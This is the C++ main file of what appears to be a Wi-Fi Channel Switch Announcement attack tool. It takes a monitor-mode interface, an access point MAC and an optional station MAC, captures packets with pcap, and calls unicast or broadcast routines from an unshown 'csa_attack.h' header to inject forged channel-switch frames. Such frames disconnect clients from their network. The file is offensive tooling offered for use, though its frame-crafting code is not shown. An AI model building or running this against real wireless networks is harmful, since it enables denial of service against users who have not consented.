#include "csa_attack.h"

void usage() {
    printf("syntax: ./csa <interface> <ap mac> [<station mac>]\n");
    printf("sample: ./csa mon0 01:23:45:67:89:AB 01:23:45:67:89:AB\n");
}

bool parse(char** interface, char** ap_mac, char** station_mac, int argc, char* argv[]) {
    if (argc < 3 || argc > 4) {
        usage();
        return false;
    }
    *interface = argv[1];
    *ap_mac = argv[2];
    if (argc == 4) {
        *station_mac = argv[3];
    } else {
        *station_mac = nullptr;
    }
    return true;
}

int main(int argc, char* argv[]) {
    char* interface = nullptr;
    char* ap_mac = nullptr;
    char* station_mac = nullptr;

    if (!parse(&interface, &ap_mac, &station_mac, argc, argv))
        return -1;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
    if (pcap == NULL) {
        fprintf(stderr, "pcap_open_live(%s) returned null - %s\n", interface, errbuf);
        return -1;
    }

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex returned %d(%s)\n", res, pcap_geterr(pcap));
            break;
        }

        if (station_mac != nullptr) {
            unicast(interface, packet, ap_mac, header->caplen, station_mac);
        } else {
            broadcast(interface, packet, ap_mac, header->caplen);
        }
    }

    pcap_close(pcap);
    return 0;
}
